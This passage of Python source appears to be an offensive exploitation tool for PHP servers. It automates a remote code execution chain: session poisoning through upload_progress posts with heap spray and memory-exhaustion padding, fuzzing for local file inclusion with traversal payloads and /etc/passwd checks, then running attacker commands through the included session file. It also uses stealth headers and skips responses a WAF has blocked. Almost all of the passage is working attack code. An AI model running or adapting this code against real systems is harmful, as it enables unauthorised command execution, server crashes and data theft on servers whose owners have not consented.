    return (time.perf_counter() - started) * 1000.0


def timing_baseline_stats(
    session: requests.Session,
    config: PoCConfig,
    url: str,
    samples: int = TIMING_BASELINE_SAMPLES,
) -> tuple[float, float]:
    values: list[float] = []
    for _ in range(max(2, samples)):
        ms = measure_http_latency_ms(session, config, url, method="GET")
        if ms is not None:
            values.append(ms)
        time.sleep(0.05)
    if not values:
        return 0.0, 0.0
    mean = sum(values) / len(values)
    if len(values) < 2:
        return mean, 0.0
    var = sum((v - mean) ** 2 for v in values) / (len(values) - 1)
    return mean, var**0.5


def is_timing_oom_anomaly(baseline_mean: float, baseline_std: float, attack_ms: float) -> bool:
    threshold = baseline_mean + TIMING_SIGMA_MULT * max(baseline_std, TIMING_DELTA_MS_FLOOR)
    return attack_ms >= threshold and attack_ms >= baseline_mean + TIMING_DELTA_MS_FLOOR


def iter_lfi_session_paths(sid: str) -> list[str]:
    paths: list[str] = []
    for tpl in SESSION_SAVE_PATH_GUESSES:
        direct = tpl.format(sid=sid)
        paths.append(direct)
        stripped = direct.lstrip("/")
        paths.append(f"....//....//{stripped}")
        paths.append(f"../{stripped}")
        paths.append(f"..%2f..%2f{stripped}")
    return list(dict.fromkeys(paths))


def build_lfi_urls(lfi_template: str, sid: str) -> list[str]:
    if LFI_FUZZ_TOKEN not in lfi_template:
        return []
    urls: list[str] = []
    for path in iter_lfi_session_paths(sid):
        for encoded in (path, quote(path, safe="/"), quote(path, safe="")):
            urls.append(lfi_template.replace(LFI_FUZZ_TOKEN, encoded))
    return list(dict.fromkeys(urls))


def lfi_page_url_candidates(target_url: str) -> list[str]:
    origin = get_origin(target_url)
    parsed = urlparse(target_url)
    seeds: list[str] = []
    for path in LFI_AUTO_PROBE_PAGES:
        seeds.append(urljoin(origin, path))
    if parsed.path and parsed.path not in ("/", ""):
        seeds.append(urljoin(origin, parsed.path))
    return list(dict.fromkeys(seeds))


def build_lfi_template_for_page(page_url: str, param: str) -> str:
    parsed = urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or "/"
    if path.endswith("/"):
        path = f"{path}index.php"
    elif not re.search(r"\.(php|phtml|php5)(?:$|\?)", path, re.I):
        path = path.rstrip("/") + "/index.php" if path != "/" else "/index.php"
    return f"{origin}{path}?{param}={LFI_FUZZ_TOKEN}"


def extract_lfi_params_from_html(html: str) -> set[str]:
    params: set[str] = set()
    if not html:
        return params
    for match in re.finditer(r"[?&]([a-zA-Z_][\w.-]{0,48})=", html):
        name = match.group(1)
        if name.lower() not in ("sid", "utm_source", "utm_medium", "fbclid"):
            params.add(name)
    if _HAS_BS4 and BeautifulSoup is not None:
        try:
            soup = BeautifulSoup(html, "html.parser")
            for tag in soup.find_all("a", href=True):
                href = tag["href"]
                if "?" in href:
                    q = urlparse(href).query
                    for part in q.split("&"):
                        if "=" in part:
                            params.add(part.split("=", 1)[0])
            for form in soup.find_all("form"):
                action = form.get("action") or ""
                if "?" in action:
                    for part in urlparse(action).query.split("&"):
                        if "=" in part:
                            params.add(part.split("=", 1)[0])
        except Exception:
            pass
    return params


def merge_lfi_param_pool(discovered: set[str]) -> list[str]:
    merged: list[str] = list(LFI_PARAM_WORDLIST)
    for name in sorted(discovered):
        if name not in merged:
            merged.append(name)
    return merged


def score_lfi_probe_response(
    body: str,
    *,
    sid: str,
    status_code: int,
    baseline_snippet: str = "",
) -> tuple[int, list[str]]:
    score = 0
    signals: list[str] = []
    if not body:
        return score, signals
    if RE_LFI_INCLUDE_ERROR.search(body):
        score += 3
        signals.append("include-error")
    if sid in body or f"sess_{sid}" in body:
        score += 4
        signals.append("sid-reflected")
    if re.search(r"upload_progress|PHPSESSID|ps_files", body, re.I):
        score += 2
        signals.append("session-artifact")
    if CORE_CHAIN_MARKER in body:
        score += 5
        signals.append("chain-marker")
    if "root:" in body and re.search(r"root:[^:]*:0:0:", body):
        score += 6
        signals.append("etc-passwd-leak")
    if baseline_snippet and body != baseline_snippet:
        if len(body) < len(baseline_snippet) * 0.6 and status_code >= 400:
            score += 1
            signals.append("short-error-body")
    return score, signals


def discover_active_lfi_route(
    session: requests.Session,
    config: PoCConfig,
    target_url: str,
    sid: str,
) -> Optional[LfiDiscoveryHit]:
    """Fuzz LFI params; lock template when include errors or sid bytes appear."""
    if not config.lfi_auto_discover:
        return None
    pages = lfi_page_url_candidates(target_url)
    discovered_params: set[str] = set()
    probe_timeout = min(config.timeout, 12.0)
    baselines: dict[str, str] = {}

    for page in pages[:6]:
        html = fetch_page_html(session, page, config, probe_timeout)
        if html:
            discovered_params |= extract_lfi_params_from_html(html)
            baselines[page] = html[:2048]

    params = merge_lfi_param_pool(discovered_params)
    best: Optional[LfiDiscoveryHit] = None
    probes = 0
    max_probes = max(20, config.lfi_discover_max_probes)

    if not config.quiet:
        console.print(
            Panel(
                f"[bold]Auto-LFI discovery[/]\n"
                f"Pages: {len(pages)} | Params: {len(params)} | Max probes: {max_probes}",
                border_style="cyan",
            )
        )

    for page in pages:
        baseline = baselines.get(page, "")
        for param in params:
            if probes >= max_probes:
                break
            template = build_lfi_template_for_page(page, param)
            probe_payload = LFI_DISCOVERY_PROBE_FILE
            probe_url = template.replace(LFI_FUZZ_TOKEN, quote(probe_payload, safe=""))
            apply_stealth_session(session, config, probe_url)
            probes += 1
            if not config.quiet and probes % 10 == 0:
                stage_log(f"[dim]Auto-LFI probe {probes}/{max_probes}…[/]")
            try:
                resp = session.get(
                    probe_url,
                    timeout=probe_timeout,
                    verify=config.verify_ssl,
                    allow_redirects=True,
                )
            except requests.RequestException:
                continue
            body = resp.text or ""
            if is_waf_blocked(resp.status_code, body):
                continue
            score, signals = score_lfi_probe_response(
                body,
                sid=sid,
                status_code=resp.status_code,
                baseline_snippet=baseline,
            )
            if score <= 0:
                continue
            if best is None or score > best.score:
                best = LfiDiscoveryHit(
                    template=template,
                    param=param,
                    score=score,
                    signals=signals,
                    probe_url=probe_url,
                )
                if not config.quiet:
                    console.print(
                        f"[cyan][AUTO-LFI][/] candidate param=[bold]{param}[/] "
                        f"score={score} signals={','.join(signals)}"
                    )
            if best and best.score >= LFI_DISCOVERY_LOCK_SCORE:
                if not config.quiet:
                    console.print(
                        f"[green bold][AUTO-LFI][/] Locked active route: "
                        f"[dim]{best.template}[/]"
                    )
                return best
        if probes >= max_probes:
            break

    if best and best.score >= LFI_DISCOVERY_MIN_SCORE:
        if not config.quiet:
            console.print(
                f"[green][AUTO-LFI][/] Locked (best effort) param={best.param} "
                f"score={best.score} template={best.template}"
            )
        return best
    if not config.quiet:
        console.print("[yellow][AUTO-LFI][/] No reliable LFI parameter discovered.")
    return None


def ensure_lfi_templates_for_chain(
    session: requests.Session,
    config: PoCConfig,
    target_url: str,
    sid: str,
) -> tuple[PoCConfig, Optional[LfiDiscoveryHit]]:
    templates = load_lfi_url_templates(config)
    if templates:
        return config, None
    if not config.lfi_auto_discover:
        return config, None
    hit = discover_active_lfi_route(session, config, target_url, sid)
    if hit:
        return replace(config, lfi_url=hit.template), hit
    return config, None


def run_lfi_session_chain(
    session: requests.Session,
    config: PoCConfig,
    *,
    sid: str,
    command: str,
) -> CoreChainResult:
    templates = load_lfi_url_templates(config)
    if not templates:
        return CoreChainResult(
            False,
            stage="lfi",
            error=(
                f"No LFI template ({LFI_FUZZ_TOKEN}); use --lfi-url, --lfi-url-file, "
                "or enable auto discovery (default)"
            ),
            sid=sid,
        )
    notes: list[str] = []
    urls: list[str] = []
    for tmpl in templates:
        urls.extend(build_lfi_urls(tmpl, sid))
    urls = list(dict.fromkeys(urls))
    if config.lfi_max_urls > 0:
        urls = urls[: config.lfi_max_urls]
    for url in urls:
        apply_stealth_session(session, config, url)
        try:
            resp = session.get(
                url,
                params={"c": command, "cmd": command},
                timeout=config.timeout,
                verify=config.verify_ssl,
                allow_redirects=True,
            )
        except requests.RequestException as exc:
            notes.append(f"lfi fail {url}: {exc}")
            continue
        body = resp.text or ""
        if is_waf_blocked(resp.status_code, body):
            notes.append(f"lfi waf {url}")
            continue
        exec_hit = looks_like_command_output(body, command)
        marker_hit = CORE_CHAIN_MARKER in body and not re.search(
            r"<!DOCTYPE|<html[\s>]", body, re.I
        )
        if exec_hit or marker_hit:
            out = clean_command_output(body)
            if exec_hit:
                kernel = re.search(
                    r"Linux\s+\S+\s+\S+\s+\d+\.\d+\.\d+(?:-\S+)?[^\n<]{0,120}",
                    body,
                )
                if kernel:
                    out = kernel.group(0).strip()
            return CoreChainResult(
                True,
                stage="lfi-session-include",
                output=out or body[:2000],
                sid=sid,
                lfi_url_used=url,
                lfi_template_locked=config.lfi_url,
                notes=notes,
            )
        if sid in body and re.search(r"upload_progress|PHPSESSID", body, re.I):
            notes.append(f"session bytes leaked via {url} (include partial)")
    return CoreChainResult(
        False,
        stage="lfi",
        error="LFI chain exhausted — no execution marker",
        sid=sid,
        notes=notes,
    )


def looks_like_command_output(body: str, command: str) -> bool:
    cmd = command.strip().lower()
    if not cmd or not body:
        return False
    html_heavy = len(body) > 4000 and re.search(r"<!DOCTYPE|<html[\s>]", body, re.I)
    if cmd == "id" and re.search(r"uid=\d+\([^)]+\)", body):
        if html_heavy and body.lower().count("uid=") > 3:
            return False
        return True
    if "uname" in cmd and re.search(
        r"Linux\s+\S+\s+\S+\s+\d+\.\d+\.\d+(?:-\S+)?\s+(?:#\d+\s+)?(?:SMP\s+)?",
        body,
    ):
        return True
    if cmd.startswith("echo ") and cmd.split(" ", 1)[1].strip("'\"") in body:
        return not html_heavy
    return False


def load_lfi_url_templates(config: PoCConfig) -> list[str]:
    templates: list[str] = []
    if config.lfi_url and LFI_FUZZ_TOKEN in config.lfi_url:
        templates.append(config.lfi_url)
    if config.lfi_url_file:
        text = Path(config.lfi_url_file).read_text(encoding="utf-8", errors="replace")
        for line in text.splitlines():
            raw = line.strip()
            if raw and not raw.startswith("#") and LFI_FUZZ_TOKEN in raw:
                templates.append(raw)
    return list(dict.fromkeys(templates))


def emit_command_output(text: str) -> None:
    """Print RCE output safely on Windows consoles."""
    try:
        console.print(text)
    except UnicodeEncodeError:
        sys.stdout.buffer.write((text + "\n").encode("utf-8", errors="replace"))
        sys.stdout.buffer.flush()


def fpm_two_step_fault_injection(
    session: requests.Session,
    config: PoCConfig,
    endpoint_url: str,
    fp: PhpFingerprint,
    *,
    sid: str,
    command: str,
) -> CoreChainResult:
    """Step 1: OOM/heap stress; step 2: upload_progress on potentially stale worker."""
    notes: list[str] = ["fpm: step1 OOM stress"]
    boundary = make_multipart_boundary(fp.branch_key)
    spray = (
        generate_heap_spray_fields(config.core_heap_spray_fields, fp)
        if config.core_heap_spray
        else []
    )
    if config.optimal_oom_bytes > 0:
        oom_pad = config.optimal_oom_bytes
    else:
        oom_pad = 5120 if config.core_aggressive_oom else max(config.core_file_padding, 2048)
    oom_body, oom_ct = build_upload_progress_multipart(
        sid=sid,
        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
        filename=f"{CORE_MARKER_PREFIX}oom.bin",
        boundary=boundary,
        file_padding=oom_pad,
        spray_fields=spray,
        file_body=build_chain_file_body(command, oom_pad, 0),
    )
    _r1, e1, ms1 = post_core_multipart(
        session, config, endpoint_url, sid=sid, boundary=boundary, body=oom_body, content_type=oom_ct
    )
    notes.append(f"fpm: step1 latency={ms1:.0f}ms err={type(e1).__name__ if e1 else 'none'}")
    time.sleep(max(0.02, config.core_fpm_stagger_sec))

    notes.append("fpm: step2 progress manipulation")
    boundary2 = make_multipart_boundary(fp.branch_key)
    prog_pad = config.core_file_padding
    body2, ct2 = build_upload_progress_multipart(
        sid=sid,
        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
        filename=f"{CORE_MARKER_PREFIX}chain.phtml",
        boundary=boundary2,
        file_padding=prog_pad,
        spray_fields=spray[: max(1, len(spray) // 2)] if spray else [],
        file_body=build_chain_file_body(command, prog_pad, 32),
        progress_value=CORE_CHAIN_MARKER,
    )
    resp2, e2, ms2 = post_core_multipart(
        session, config, endpoint_url, sid=sid, boundary=boundary2, body=body2, content_type=ct2
    )
    notes.append(f"fpm: step2 latency={ms2:.0f}ms")
    timing_anomaly = False
    if config.core_timing_probe:
        base_mean, base_std = timing_baseline_stats(session, config, endpoint_url)
        timing_anomaly = is_timing_oom_anomaly(base_mean, base_std, ms1) or is_timing_oom_anomaly(
            base_mean, base_std, ms2
        )
        notes.append(
            f"timing: baseline={base_mean:.0f}+/-{base_std:.0f}ms "
            f"anomaly={timing_anomaly}"
        )

    if resp2 is not None:
        body = resp2.text or ""
        events = parse_core_memory_events(body, resp2.status_code)
        exec_hit = looks_like_command_output(body, command)
        marker_hit = CORE_CHAIN_MARKER in body and not re.search(
            r"<!DOCTYPE|<html[\s>]", body, re.I
        )
        if exec_hit or marker_hit:
            out = clean_command_output(body)
            if exec_hit:
                kernel = re.search(
                    r"Linux\s+\S+\s+\S+\s+\d+\.\d+\.\d+(?:-\S+)?[^\n<]{0,120}",
                    body,
                )
                if kernel:
                    out = kernel.group(0).strip()
            return CoreChainResult(
                bool(exec_hit or (marker_hit and out)),
                stage="fpm-two-step",
                output=out,
                sid=sid,
                timing_ms=ms2,
                timing_anomaly=timing_anomaly,
                notes=notes,
            )
        if events:
            notes.extend(events)

    if e1 or e2:
        notes.append("fpm: transport fault — worker may have recycled (stale window)")
    return CoreChainResult(
        False,
        stage="fpm-two-step",
        error="two-step fault did not yield execution (try --lfi-url)",
        sid=sid,
        timing_ms=ms2,
        timing_anomaly=timing_anomaly,
        notes=notes,
    )


def run_core_chain_exploit(
    session: requests.Session,
    config: PoCConfig,
    target_url: str,
    core: CoreProbeResult,
    command: str,
) -> CoreChainResult:
    """Automated core RCE chain: poison session, optional FPM two-step, LFI trigger."""
    cmd = command.strip() or "id"
    fp = parse_php_version_header(core.php_version) if core.php_version else fetch_php_fingerprint(
        session, config, target_url
    )
    profile = detect_sapi_profile(session, config, target_url, fp)
    config = apply_sapi_exploit_strategy(config, profile)
    if config.optimal_oom_bytes <= 0 and core.oom_threshold_bytes > 0:
        config = replace(config, optimal_oom_bytes=core.oom_threshold_bytes)
    if config.core_worker_pin:
        configure_worker_pinning(session)
    sid = core.sid
    endpoint = core.endpoint
    console.print(
        Panel(
            f"[bold]Core chain exploit[/]\n"
            f"CVE: {core.cve_ids}\nEndpoint: {endpoint}\nPHPSESSID: {sid}\nCommand: {cmd}",
            border_style="magenta",
        )
    )

    spray = (
        generate_heap_spray_fields(config.core_heap_spray_fields, fp)
        if config.core_heap_spray
        else []
    )
    boundary = make_multipart_boundary(fp.branch_key)
    pad = core.padding_used or config.core_file_padding
    body, ct = build_upload_progress_multipart(
        sid=sid,
        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
        filename=f"{CORE_MARKER_PREFIX}chain.phtml",
        boundary=boundary,
        file_padding=pad,
        heap_align=core.alignment_used,
        spray_fields=spray,
        file_body=build_chain_file_body(cmd, pad, core.alignment_used),
        progress_value=CORE_CHAIN_MARKER,
    )
    _resp, _exc, poison_ms = post_core_multipart(
        session, config, endpoint, sid=sid, boundary=boundary, body=body, content_type=ct
    )
    notes = [f"session poison POST {poison_ms:.0f}ms spray_fields={len(spray)}"]

    timing_anomaly = False
    if config.core_timing_probe:
        base_mean, base_std = timing_baseline_stats(session, config, endpoint)
        timing_anomaly = is_timing_oom_anomaly(base_mean, base_std, poison_ms)
        notes.append(
            f"timing baseline={base_mean:.0f}ms sigma={base_std:.0f}ms "
            f"attack={poison_ms:.0f}ms anomaly={timing_anomaly}"
        )
        if timing_anomaly and not config.quiet:
            console.print("[yellow][TIMING][/] OOM-like latency spike detected (silent error mode).")

    fpm_result: Optional[CoreChainResult] = None
    if config.core_fpm_two_step:
        fpm_result = fpm_two_step_fault_injection(
            session, config, endpoint, fp, sid=sid, command=cmd
        )
        notes.extend(fpm_result.notes)
        if fpm_result.success:
            return fpm_result

    config, lfi_hit = ensure_lfi_templates_for_chain(session, config, target_url, sid)
    if lfi_hit:
        notes.append(
            f"auto-lfi locked param={lfi_hit.param} score={lfi_hit.score} "
            f"signals={','.join(lfi_hit.signals)}"
        )

    if load_lfi_url_templates(config):
        lfi_result = run_lfi_session_chain(session, config, sid=sid, command=cmd)
        lfi_result.notes = notes + lfi_result.notes
        lfi_result.timing_anomaly = timing_anomaly or lfi_result.timing_anomaly
        lfi_result.timing_ms = poison_ms
        if lfi_hit and not lfi_result.lfi_template_locked:
            lfi_result.lfi_template_locked = lfi_hit.template
        if lfi_result.success:
            render_core_chain_result(lfi_result)
            if lfi_result.output and cmd:
                emit_command_output(lfi_result.output)
            return lfi_result
        if fpm_result and fpm_result.success:
            return fpm_result
        merged = CoreChainResult(
            False,
            stage="core-chain",
            error=lfi_result.error or (fpm_result.error if fpm_result else "chain incomplete"),
            sid=sid,
            timing_ms=poison_ms,
            timing_anomaly=timing_anomaly,
            lfi_template_locked=config.lfi_url,
            notes=notes + lfi_result.notes,
        )
        render_core_chain_result(merged)
        return merged

    if fpm_result:
        fpm_result.notes = notes + fpm_result.notes
        render_core_chain_result(fpm_result)
        return fpm_result

    partial = CoreChainResult(
        False,
        stage="core-poison-only",
        error="Session poison sent; auto-LFI found no route — try --lfi-url or --core-fpm-two-step",
        sid=sid,
        timing_ms=poison_ms,
        timing_anomaly=timing_anomaly,
        notes=notes,
    )
    render_core_chain_result(partial)
    return partial


def render_core_chain_result(result: CoreChainResult) -> None:
    style = "green" if result.success else "yellow"
    table = Table(title="Core chain result", header_style="bold")
    table.add_column("Key")
    table.add_column("Value")
    table.add_row("Success", str(result.success))
    table.add_row("Stage", result.stage)
    table.add_row("SID", result.sid)
    if result.lfi_template_locked:
        table.add_row("LFI template", result.lfi_template_locked)
    if result.lfi_url_used:
        table.add_row("LFI URL", result.lfi_url_used)
    if result.timing_ms:
        table.add_row("Latency", f"{result.timing_ms:.0f} ms")
    if result.timing_anomaly:
        table.add_row("Timing", "[yellow]OOM-like spike[/]")
    if result.error:
        table.add_row("Error", result.error)
    if result.output:
        table.add_row("Output", result.output[:500])
    console.print(table)
    if result.notes:
        console.print(Panel("\n".join(f"- {n}" for n in result.notes[-12:]), title="Chain log"))


def php_version_signal(headers: Any, fp: Optional[PhpFingerprint] = None) -> Optional[str]:
    if fp and fp.version_raw:
        if fp.patch_status in ("vulnerable", "eol-vulnerable"):
            return f"vulnerable-php:{fp.version_raw}"
        if fp.patch_status == "patched":
            return f"patched-php:{fp.version_raw}"
    powered = headers.get("X-Powered-By", "") or headers.get("x-powered-by", "")
    if not powered:
        return None
    parsed = parse_php_version_header(powered)
    if parsed.patch_status in ("vulnerable", "eol-vulnerable"):
        return f"vulnerable-php:{powered.strip()}"
    if parsed.patch_status == "patched":
        return f"patched-php:{powered.strip()}"
    return None


def parse_core_memory_events(body: str, status_code: int) -> list[str]:
    events: list[str] = []
    if RE_OOM_109618.search(body):
        events.append("oom:memory-limit-exhausted")
    if RE_SESSION_109619.search(body):
        events.append("session:upload-progress-path")
    if re.search(r"Session object destruction failed", body, re.I):
        events.append("session:object-destruction-failed")
    if re.search(r"fatal_error_backtrace", body, re.I):
        events.append("session:fatal-backtrace-8.5")
    if status_code in (500, 502, 503) and RE_WORKER_FAULT.search(body):
        events.append("worker:fault-response")
    if CORE_RESPONSE_SIGNALS.search(body):
        events.append("core:generic-progress-signature")
    return events


def classify_cve_from_events(events: list[str], fp: PhpFingerprint) -> str:
    has_618 = any(e.startswith("oom:") for e in events)
    has_619 = any(
        e.startswith("session:") or e == "core:generic-progress-signature" for e in events
    )
    if has_618 and has_619:
        return f"{CVE_109618},{CVE_109619}"
    if has_618:
        return CVE_109618
    if has_619:
        return CVE_109619
    if fp.patch_status in ("vulnerable", "eol-vulnerable"):
        return f"{CVE_109618},{CVE_109619}(surface)"
    return "unknown"


def log_core_memory_events(endpoint: str, events: list[str], *, quiet: bool) -> None:
    if quiet or not events:
        return
    tags = []
    for ev in events:
        if ev.startswith("oom:"):
            tags.append(f"[red][OOM][/]{ev.split(':', 1)[1]}")
        elif ev.startswith("session:"):
            tags.append(f"[magenta][SESSION][/]{ev.split(':', 1)[1]}")
        elif ev.startswith("worker:"):
            tags.append(f"[yellow][WORKER][/]{ev.split(':', 1)[1]}")
        else:
            tags.append(f"[dim][CORE][/]{ev}")
    console.print(f"[dim]  events @ {endpoint}:[/] " + " | ".join(tags))


def build_session_chain_hints(sid: str, fp: PhpFingerprint) -> tuple[list[str], list[str]]:
    paths = [p.format(sid=sid) for p in SESSION_SAVE_PATH_GUESSES]
    notes = [
        "1) Re-use PHPSESSID from probe; confirm session.save_path via phpinfo/LFI if possible.",
        f"2) LFI/session include targets: sess_{sid} under common save_path dirs.",
        "3) For FPM: stale worker state may need a fatal on worker A then progress upload on worker B.",
    ]
    if fp.branch_key.startswith("8.5"):
        notes.append("4) PHP 8.5: test fatal_error_backtrace=0 mitigation status on target.")
    notes.append("5) OOM chain (109618): tune padding near memory_limit; watch worker recycle.")
    return paths, notes


def render_core_exploit_chain(core: CoreProbeResult) -> None:
    table = Table(title="Core exploit chain planner", show_header=True, header_style="bold cyan")
    table.add_column("Stage", style="dim")
    table.add_column("Detail")
    table.add_row("CVE", core.cve_ids or "unknown")
    table.add_row("PHP", core.php_version or "unknown")
    table.add_row("SAPI", core.sapi_type or SAPI_UNKNOWN)
    table.add_row("Patch", core.patch_status)
    table.add_row("Endpoint", core.endpoint)
    table.add_row("PHPSESSID", core.sid)
    if core.oom_threshold_bytes:
        table.add_row("OOM threshold", f"{core.oom_threshold_bytes} bytes (~{core.oom_threshold_bytes // 1024}KB)")
    table.add_row("Stale/UAF", core.stale_state)
    table.add_row("Padding", f"{core.padding_used} bytes (align={core.alignment_used})")
    if core.latency_ms:
        table.add_row("Last latency", f"{core.latency_ms:.0f} ms")
    if core.timing_anomaly:
        table.add_row("Timing", "[yellow]OOM-like spike[/]")
    if core.worker_crash:
        table.add_row("ASLR probe", "[yellow]worker crash observed — retry adjacent padding[/]")
    table.add_row("Session files", "\n".join(core.session_paths[:4]))
    table.add_row("FPM sockets", "\n".join(FPM_SOCKET_GUESSES[:4]))
    table.add_row("LFI hints", "\n".join(h.format(sid=core.sid) for h in LFI_CHAIN_HINTS[:3]))
    console.print(table)
    if core.chain_notes:
        console.print(
            Panel("\n".join(f"• {n}" for n in core.chain_notes), title="Next steps", border_style="magenta")
        )


def resolve_adaptive_padding_candidates(
    config: PoCConfig,
    fp: PhpFingerprint,
) -> list[int]:
    if config.optimal_oom_bytes > 0:
        primary = min(config.optimal_oom_bytes, MAX_CORE_MULTIPART_BYTES)
        return list(dict.fromkeys([primary, max(CORE_DEFAULT_PADDING, primary // 4)]))
    if config.core_aggressive_oom:
        return [5120]
    if config.core_adaptive and fp.branch_key in PHP_BRANCH_PADDING:
        base = list(PHP_BRANCH_PADDING[fp.branch_key])
        if config.core_file_padding not in base:
            base.insert(0, config.core_file_padding)
        return base
    return [config.core_file_padding]


def is_worker_crash_response(
    exc: Optional[BaseException],
    status_code: int,
    body: str,
) -> bool:
    if exc is not None:
        if isinstance(exc, (RequestsConnectionError, ConnectionResetError)):
            return True
    if status_code in (502, 503, 504) and len(body) < 4096:
        if RE_WORKER_FAULT.search(body) or body.strip() == "":
            return True
    if RE_WORKER_FAULT.search(body):
        return True
    return False


def analyze_core_probe_response(
    resp: requests.Response,
    *,
    token: str,
    sid: str,
    fp: Optional[PhpFingerprint] = None,
) -> tuple[list[str], list[str]]:
    signals: list[str] = []
    body = resp.text or ""
    headers = resp.headers

    ver = php_version_signal(headers, fp)
    if ver:
        signals.append(ver)

    events = parse_core_memory_events(body, resp.status_code)
    if events:
        signals.append("memory-session-events")
        for ev in events:
            signals.append(f"event:{ev}")

    if CORE_RESPONSE_SIGNALS.search(body):
        signals.append("upload-progress-or-oom-signature")

    if token in body:
        signals.append("filename-token-reflected")

    set_cookie = headers.get("Set-Cookie") or ""
    if sid in body or "PHPSESSID" in set_cookie:
        signals.append("session-handshake")

    if "PHPSESSID" in body:
        signals.append("phpsessid-in-body")

    return signals, events


def core_probe_single_attempt(
    session: requests.Session,
    config: PoCConfig,
    endpoint_url: str,
    *,
    fp: PhpFingerprint,
    file_padding: int,
    heap_align: int,
) -> CoreProbeResult:
    sid = f"p2s{uuid.uuid4().hex[:16]}"
    token = uuid.uuid4().hex[:10]
    marker = f"{CORE_MARKER_PREFIX}{token}"
    filename = f"{marker}.txt"
    boundary = make_multipart_boundary(fp.branch_key)

    spray = (
        generate_heap_spray_fields(config.core_heap_spray_fields, fp)
        if config.core_heap_spray
        else []
    )
    body, content_type = build_upload_progress_multipart(
        sid=sid,
        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
        filename=filename,
        boundary=boundary,
        file_padding=file_padding,
        heap_align=heap_align,
        spray_fields=spray,
    )

    baseline_mean = baseline_std = 0.0
    if config.core_timing_probe:
        baseline_mean, baseline_std = timing_baseline_stats(session, config, endpoint_url)

    resp, exc, elapsed_ms = post_core_multipart(
        session,
        config,
        endpoint_url,
        sid=sid,
        boundary=boundary,
        body=body,
        content_type=content_type,
    )
    timing_anomaly = False
    if config.core_timing_probe:
        timing_anomaly = is_timing_oom_anomaly(baseline_mean, baseline_std, elapsed_ms)

    if resp is None:
        crashed = is_worker_crash_response(exc, 0, "")
        paths, notes = build_session_chain_hints(sid, fp)
        return CoreProbeResult(
            False,
            endpoint_url,
            sid,
            ["worker-crash" if crashed else "network-error"],
            False,
            memory_events=["worker:transport-fault"] if crashed else [],
            cve_ids="",
            patch_status=fp.patch_status,
            php_version=fp.version_raw,
            padding_used=file_padding,
            alignment_used=heap_align,
            worker_crash=crashed,
            session_paths=paths,
            chain_notes=notes,
        )

    if is_waf_blocked(resp.status_code, resp.text):
        return CoreProbeResult(False, endpoint_url, sid, [], True)

    signals, events = analyze_core_probe_response(resp, token=token, sid=sid, fp=fp)
    crashed = is_worker_crash_response(None, resp.status_code, resp.text or "")
    if crashed:
        signals.append("worker-crash")
        events.append("worker:crash-or-reset")

    if resp.status_code in (500, 502, 503) and "upload-progress-or-oom-signature" in signals:
        signals.append("server-error-on-progress")

    if timing_anomaly:
        signals.append("timing-oom-anomaly")
        events.append("oom:timing-latency-spike")

    cve_ids = classify_cve_from_events(events, fp)
    strict_ok = (
        cve_ids != "unknown"
        and not cve_ids.endswith("(surface)")
        and fp.patch_status in ("vulnerable", "eol-vulnerable", "unknown")
    )
    loose_ok = len(signals) >= 2 or (
        "filename-token-reflected" in signals and "session-handshake" in signals
    )
    if config.strict_cve:
        vulnerable = strict_ok and fp.patch_status != "patched"
    else:
        vulnerable = loose_ok and fp.patch_status != "patched"

    paths, notes = build_session_chain_hints(sid, fp)
    return CoreProbeResult(
        vulnerable,
        endpoint_url,
        sid,
        signals,
        False,
        memory_events=events,
        cve_ids=cve_ids,
        patch_status=fp.patch_status,
        php_version=fp.version_raw,
        padding_used=file_padding,
        alignment_used=heap_align,
        worker_crash=crashed,
        session_paths=paths,
        chain_notes=notes,
        latency_ms=elapsed_ms,
        timing_anomaly=timing_anomaly,
    )


def core_probe_endpoint(
    session: requests.Session,
    config: PoCConfig,
    endpoint_url: str,
    *,
    fp: PhpFingerprint,
    profile: SapiProfile,
) -> CoreProbeResult:
    oom_notes: list[str] = []
    optimal, oom_notes = run_oom_fuzz_calibration(session, config, endpoint_url, fp, profile)
    cfg = config
    if optimal > 0:
        cfg = replace(config, optimal_oom_bytes=optimal)
    paddings = resolve_adaptive_padding_candidates(cfg, fp)
    alignments = CORE_ALIGNMENT_STEPS if config.core_aslr_probe else (0,)
    best: Optional[CoreProbeResult] = None
    last_crash_pad: Optional[int] = None

    for pad in paddings:
        if last_crash_pad is not None and config.core_aslr_probe and pad > last_crash_pad:
            pad = max(CORE_DEFAULT_PADDING, last_crash_pad - 64)
        for align in alignments:
            result = core_probe_single_attempt(
                session,
                cfg,
                endpoint_url,
                fp=fp,
                file_padding=pad,
                heap_align=align,
            )
            result.sapi_type = profile.sapi
            result.oom_threshold_bytes = optimal or cfg.optimal_oom_bytes
            result.stale_state = classify_stale_state(
                result.memory_events,
                worker_crash=result.worker_crash,
                timing_anomaly=result.timing_anomaly,
                profile=profile,
            )
            if oom_notes:
                result.chain_notes = oom_notes + result.chain_notes
            if result.waf_blocked:
                return result
            if result.worker_crash and config.core_aslr_probe:
                last_crash_pad = pad
                if not config.quiet:
                    console.print(
                        f"[yellow][ASLR][/] worker fault @ pad={pad} align={align} — stepping down[/]"
                    )
                continue
            if best is None or (
                result.vulnerable and len(result.signals) > len(best.signals)
            ):
                best = result
            elif best and result.vulnerable and len(result.memory_events) > len(best.memory_events):
                best = result
    fallback = CoreProbeResult(
        False,
        endpoint_url,
        f"p2s{uuid.uuid4().hex[:16]}",
        [],
        False,
        patch_status=fp.patch_status,
        php_version=fp.version_raw,
        sapi_type=profile.sapi,
        oom_threshold_bytes=optimal,
    )
    if oom_notes:
        fallback.chain_notes = oom_notes
    return best or fallback


def iter_core_probe_urls(base_url: str) -> list[str]:
    origin = get_origin(base_url)
    parsed = urlparse(base_url)
    urls = [urljoin(origin, parsed.path or "/")]
    for path in CORE_PROBE_PATHS:
        candidate = urljoin(origin, path)
        if candidate not in urls:
            urls.append(candidate)
    return urls


def check_php_core_upload_progress(
    session: requests.Session,
    config: PoCConfig,
    target_url: str,
    *,
    quiet: bool = False,
) -> Optional[CoreProbeResult]:
    if not config.core_check_enabled:
        return None

    if not quiet:
        stage_log(f"[dim]Core probe started[/] {target_url}")

    fp = fetch_php_fingerprint(session, config, target_url)
    profile = detect_sapi_profile(session, config, target_url, fp)
    effective = apply_sapi_exploit_strategy(config, profile)
    if effective.core_worker_pin:
        configure_worker_pinning(session)
    if not quiet:
        if fp.version_raw:
            console.print(
